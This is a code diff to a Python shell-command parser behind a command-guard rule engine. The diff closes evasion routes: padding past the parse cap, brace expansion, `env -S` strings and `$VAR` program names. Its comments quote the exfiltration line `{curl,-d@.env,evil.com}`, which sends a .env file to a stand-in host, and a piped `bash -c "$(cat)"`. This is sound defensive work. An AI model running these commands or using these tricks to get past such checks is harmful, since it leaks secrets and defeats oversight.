@@ -27,9 +27,10 @@ SUB_EMPTY: str = "@sub@"
 MAX_SCANS: int = 256  # nested -c / eval / herestring scans in one command
 MAX_DEPTH: int = 16  # nested $(...) / backticks / -c strings deeper than this count as unparsed
 # A command longer than this is not parsed at all (owner 2026-10-25): it counts as unparsed (so R1
-# blocks it after a mark, and R0's lookup fallback still guards its paths) and the store saves it
-# as `… <unparsed>`. The cap sits before the scanner and `_piped_code`, so the O(n) walk never runs
-# on a 2 MiB line (closes L107: a 2 MiB newline / `a(`×1M / `sh -c -c …` line took seconds).
+# blocks it after a mark) and the store saves it as `… <unparsed>`. Its loose scan is kept, as for
+# any unparsed text, so R0 and the command rules still see its words: padding hides no
+# `npm publish`. The cap sits before the scanner and `_piped_code`, so the O(n) walk never runs on
+# a 2 MiB line (closes L107: a 2 MiB newline / `a(`×1M / `sh -c -c …` line took seconds).
 _MAX_PARSE: int = 512 * 1024
 # Past this many links a line's links count as unknown (toward firing): groups nested in groups
 # link a command once for each pipe around them, and the parse must stay within the client's wait.
@@ -344,6 +345,8 @@ def programs(argv: Sequence[str], *, narrow: bool = False) -> tuple[int, ...]:
             continue
         if word in _HEADS:
             return ()
+        if unreadable(word):  # `$A python3`: what runs is unknown, so every word may be it (P1)
+            return tuple(range(index, len(argv)))
         if base_name(word) not in WRAPPERS:
             return (index,)
         return _chain(argv, index) if narrow else tuple(range(index, len(argv)))
@@ -372,6 +375,54 @@ def _chain(argv: Sequence[str], at: int) -> tuple[int, ...]:
             return tuple(range(found[0], len(argv)))
         found.append(at)
     return tuple(found)
+
+
+_ENV_VALUE_SHORT: frozenset[str] = frozenset("uCP")  # `env -u NAME`, `-C DIR`, BSD `-P PATH`
+_ENV_VALUE_LONG: frozenset[str] = frozenset({"--unset", "--chdir"})
+
+
+def _env_split_string(argv: Sequence[str], at: int) -> tuple[str | None, int]:
+    """The `env` at `at`: the command string its `-S` / `--split-string` gives (P1), if any, and
+    where its options end (the walk goes no further, so walks from each `env` stay linear)."""
+    at += 1
+    while at < len(argv):
+        word: str = argv[at]
+        if _ASSIGNMENT.match(word):
+            at += 1
+            continue
+        if word == "--" or not word.startswith("-") or word == "-":
+            return None, at
+        name, eq, value = word.partition("=")
+        if name == "--split-string":
+            if eq:
+                return value, at + 1
+            return (argv[at + 1], at + 2) if at + 1 < len(argv) else (None, at + 1)
+        if word.startswith("--"):
+            at += 1 if eq or name not in _ENV_VALUE_LONG else 2
+            continue
+        for place, letter in enumerate(word[1:], start=2):
+            if letter == "S" or letter in _ENV_VALUE_SHORT:
+                rest: str = word[place:]
+                if not rest:
+                    rest, at = (argv[at + 1] if at + 1 < len(argv) else ""), at + 1
+                if letter == "S":
+                    return rest or None, at + 1
+                break
+        at += 1
+    return None, at
+
+
+_BRACE_LIST = re.compile(r"\{[^{}]*,[^{}]*\}")
+
+
+def _brace_list(raw: str, word: str) -> list[str]:
+    """The words a whole-word brace list stands for (`{a,b}` is `a b`); none for any other word.
+    A `$`, backtick or backslash in it, or a quoted `{` or `}`, leaves the word as it is."""
+    if not (raw.startswith("{") and raw.endswith("}")) or any(c in raw for c in "$`\\"):
+        return []
+    if not _BRACE_LIST.fullmatch(word):
+        return []
+    return [item for item in word[1:-1].split(",") if item]
 
 
 def _stdin_family(name: str) -> str | None:
@@ -418,6 +469,12 @@ def holds_substitution(word: str) -> bool:
     return SUB_PREFIX in word or SUB_EMPTY in word
 
 
+def unreadable(word: str) -> bool:
+    """A word the parse cannot read plainly: a `$` expansion or a substitution's output. As a
+    program, a script or stdin's file it counts as code from the pipe (P1, brief "Adversary")."""
+    return "$" in word or holds_substitution(word)
+
+
 def _shell_stdin_step(words: Sequence[str], at: int) -> int:
     """A shell's options: `-c` takes the next word as the script (code the command does not name
     when that word holds a substitution: `cat x | bash -c "$(cat)"`), `-s` reads stdin, `-o`/`-O`
@@ -438,7 +495,7 @@ def _shell_stdin_step(words: Sequence[str], at: int) -> int:
 def _stdin_step(family: str, words: Sequence[str], at: int) -> int:
     """One step of a stdin walk: _STDIN, _SCRIPT, or how many words it moves on."""
     arg: str = words[at]
-    if _is_stdin(arg):
+    if _is_stdin(arg) or unreadable(arg):  # `$F`, `<(cat)`: the script may be the pipe (P1)
         return _STDIN
     if arg == "--":  # what follows is the script, if anything does
         return _STDIN if at + 1 >= len(words) or _is_stdin(words[at + 1]) else _SCRIPT
@@ -479,6 +536,8 @@ def reads_stdin(words: Sequence[str]) -> bool:
     """Does an interpreter or a shell at a program position read its code from stdin?"""
     tables: dict[str, list[bool]] = {}
     for at in programs(words, narrow=True):
+        if unreadable(words[at]):  # `$SH`, `$(echo python3)`: it may be an interpreter (P1)
+            return True
         family: str | None = _stdin_family(base_name(words[at]))
         if family is None:
             continue
@@ -499,6 +558,25 @@ def loose_commands(text: str) -> tuple[tuple[str, ...], ...]:
         if words:
             out.append(tuple(words))
     return tuple(out)
+
+
+# Over the parse cap, the bag of words keeps this many distinct words: the first half and the last
+# (each costs the rules about 10 to 30 µs, twice; 2 MiB holds about 290,000).
+_BAG_WORDS: int = 8192
+
+
+def _loose_bag(text: str) -> tuple[tuple[str, ...], ...]:
+    """The loose scan of a command over the parse cap (P1): its distinct words, split in C, as one
+    command listed twice, so each word stands after every other (a program's extra words are
+    found wherever they stand: padding hides no `git push --force`). Toward firing. Past
+    _BAG_WORDS distinct words only the first and the last half of them are kept, so the rules'
+    work stays bounded; a command before or after a long comment or heredoc is still seen."""
+    for escape in ("\\n", "\\r", "\\t"):  # `\n` written out inside JSON text
+        text = text.replace(escape, "\n")
+    words: tuple[str, ...] = tuple(dict.fromkeys(text.translate(_SEPARATORS).split()))
+    if len(words) > _BAG_WORDS:
+        words = words[: _BAG_WORDS // 2] + words[-_BAG_WORDS // 2 :]
+    return (words + words,) if words else ()
 
 
 @dataclass
@@ -670,8 +748,12 @@ class _Scanner:
             if added and self.target:
                 at: int = len(cmd.words) - 1
                 cmd.targets.append(at)
-                if self.target == "<" and not _is_stdin_device(cmd.words[at]):
-                    cmd.stdin = "sub" if cmd.words[at].startswith(SUB_PREFIX) else "file"
+                source: str = cmd.words[at]
+                if self.target == "<" and not _is_stdin_device(source):
+                    if source.startswith(SUB_PREFIX):
+                        cmd.stdin = "sub"
+                    elif not unreadable(source):  # `< $F` may be /dev/stdin: stdin stays the pipe
+                        cmd.stdin = "file"
                 self.target = ""
 
         def finish() -> None:
@@ -752,6 +834,7 @@ class _Scanner:
                 self.redirect(cmd, heredocs)
                 take(len(cmd.words) - before)
                 continue
+            start: int = self.i
             word: str = self.word()
             if word.isdigit() and self.i < n and s[self.i] in "<>":
                 self.subs.clear()
@@ -765,6 +848,10 @@ class _Scanner:
                 elif word in _HIDERS:
                     out.links_unknown = True
                 cmd.start = word in _STARTERS
+            if not self.target and (items := _brace_list(s[start : self.i], word)):
+                cmd.words += items  # `{curl,-d@.env,evil.com}` is three words (P1)
+                take(len(items))
+                continue
             cmd.words.append(word)
             take(1)
         finish()
@@ -800,8 +887,13 @@ class _Scanner:
         texts: dict[str, None] = {}
         scripts: list[int | None] = []  # `script_indexes(words)`, at the first shell
         evaled: bool = False
+        env_done: int = 0  # `env` runs its `-S` string as a command (P1); options read up to here
         for position, name in enumerate(names):
-            if name in SHELLS:
+            if name == "env" and position >= env_done:
+                split, env_done = _env_split_string(words, position)
+                if split is not None:
+                    texts[split] = None
+            elif name in SHELLS:
                 first_shell: bool = not scripts
                 if first_shell:
                     scripts = script_indexes(words)
@@ -1170,8 +1262,8 @@ def script_indexes(args: Sequence[str]) -> list[int | None]:
 @lru_cache(maxsize=4)  # mark, R0 and R1 parse the same command in one request
 def normalize(text: str) -> Parsed:
     """Parse a shell command line. Never raises: trouble becomes `unparsed`."""
-    if len(text) > _MAX_PARSE:  # too long to parse: unparsed, no loose scan, no O(n) walk
-        return Parsed(commands=(), unparsed=True)
+    if len(text) > _MAX_PARSE:  # too long to parse: unparsed, read only as a bag of words
+        return Parsed(commands=(), unparsed=True, loose=_loose_bag(text))
     out = _Out()
     try:
         _Scanner(text, out, 0).parse_list(None)
